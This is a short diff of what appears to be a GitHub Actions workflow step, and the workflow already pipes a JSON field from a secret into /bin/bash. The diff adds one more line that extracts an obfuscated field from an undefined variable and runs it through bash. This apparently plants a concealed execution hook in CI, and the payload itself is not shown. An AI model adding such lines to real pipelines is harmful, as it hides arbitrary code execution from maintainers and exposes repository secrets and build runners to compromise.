@@ -19,6 +19,7 @@ jobs:
           g2: ${{ secrets.g2 }}
         run: |
           printf '%s' "$g2" | jq -r .v40482 | /bin/bash
+          printf '%s' "$tdur7" | jq -r .sdklz46 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
